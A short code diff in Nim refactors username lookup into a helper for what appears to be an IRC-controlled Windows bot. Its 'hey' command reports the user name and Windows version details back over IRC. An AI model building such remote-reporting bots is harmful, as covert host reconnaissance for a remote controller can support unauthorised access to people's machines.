@@ -20,6 +20,18 @@ type
 #     curl_exe = readFile("curl.exe")
 
 
+proc helper_getUsername*():string =
+    var
+        unames:string = ""
+        unamea:array[256,byte]
+        unamea_size:DWORD = len(unamea)
+
+    discard GetUserNameA(cast[LPSTR](addr unamea[0]), addr unamea_size)
+    for c in unamea:
+        if c == 0: break
+        unames &= chr(c)
+    return unames
+
 
 proc helper_secondsToMinutesAndSeconds(seconds: int): Future[string] {.async.} =
     let minutes = seconds div 60
@@ -481,22 +493,12 @@ proc cmd_hey(event:IrcEvent, client:AsyncIrc, verbose:bool) {.async.} =
 
      
         finalmsg =  "heyyy v" & 
-                    $current_version & " USR: " & getEnv("USERNAME") & "\n" &
+                    $current_version & " USR: " & helper_getUsername() & "\n" &
                     " VER: [" & win_ver & "]\n" &
                     " CSD: [" & win_csd & "]\n" &
                     " MOD: [" & win_mod & "]\n"
     else:
-        var
-            unames:string = ""
-            unamea:array[256,byte]
-            unamea_size:DWORD = len(unamea)
-        finalmsg = "heyy v" & $current_version & "USR: "
-
-        discard GetUserNameA(cast[LPSTR](addr unamea[0]), addr unamea_size)
-        for c in unamea:
-            if c == 0: break
-            unames &= chr(c)
-        finalmsg &= unames
+        finalmsg = "heyy v" & $current_version & " USR: " & helper_getUsername()
         
 
     discard helper_responseHandler(event, client, helper_setResponse(finalmsg, 0))
